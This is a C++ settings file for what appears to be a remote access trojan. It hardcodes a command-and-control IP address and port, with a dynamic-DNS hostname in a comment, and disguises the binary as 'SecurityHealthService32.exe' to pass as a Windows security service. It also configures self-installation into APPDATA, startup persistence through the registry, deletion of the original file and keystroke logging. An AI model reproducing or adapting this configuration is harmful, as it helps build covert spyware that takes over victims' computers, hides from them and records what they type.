#include "settings.h"

std::string Settings::serverIP = "161.97.72.224";	/*windistupdate.ddns.net*/	//server ip
int Settings::serverPort = 8443;	//server port

std::string Settings::fileName = "SecurityHealthService32.exe";					//file name
std::string Settings::folderName = "ShellManagerService";					//name of folder where file is located
std::string Settings::startupName = "SecurityHealthService32.exe";		//startup name in registry / taskmgr
std::string Settings::logFileName = "log.txt";								//name of log file
std::string Settings::installLocation = "APPDATA";			//install location (appdata, programdata etc)
std::string Settings::keylogPath = "audhumla.txt";
bool Settings::installSelf = true;				//specifies whether the program should install itself
bool Settings::startOnNextBoot = false;		//specifies whether it should startup the installed clone of itself NOW or ON THE NEXT BOOT (ONLY IMPORTANT FOR INSTALLATION PROCESS)
bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file
bool Settings::setStartupSelf = true;			//specifies whether the program is to be started on system boot
bool Settings::logEvents = true;			//specifies whether the program should log events (like errors etc)
bool Settings::logKeys = false;		//[EARLY STAGE, VERY RESOURCE-DEMANDING]	//specifies whether the program should log the users keystrokes